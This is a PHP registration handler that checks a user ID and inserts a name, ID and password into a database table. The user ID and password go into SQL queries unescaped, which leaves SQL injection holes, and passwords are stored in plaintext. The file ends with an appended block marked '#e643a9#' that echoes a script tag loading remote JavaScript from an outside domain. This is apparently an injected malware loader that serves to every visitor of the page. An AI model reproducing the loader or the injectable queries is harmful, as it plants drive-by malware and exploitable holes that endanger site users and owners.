<?
	session_start();
	include('lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
	
	$user_name=$_POST['user_name'];
	$user_id=$_POST['user_id'];
	$user_pw=$_POST['user_pw']; //for registration
	
	if($user_name!="" && $user_id!="" && $user_pw!=""){
		$sql="select * from Vocals_register where user_id=trim('".$user_id."')";
		$result=sql_query($sql);
		$data=mysql_fetch_array($result);
		if($data[user_id]){
			echo "fail";
		}else{
			$sql="insert into Vocals_register(user_name,user_id,user_pw) values ('".addslashes(htmlspecialchars($user_name))."', '".addslashes(htmlspecialchars($user_id))."', trim('".$user_pw."'));";
			sql_query($sql);
			echo "success";
		}
	}else{
		echo "fail2";
	}
?>
<?php
#e643a9#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155830\"></script>";
echo $vt;
}
#/e643a9#
?>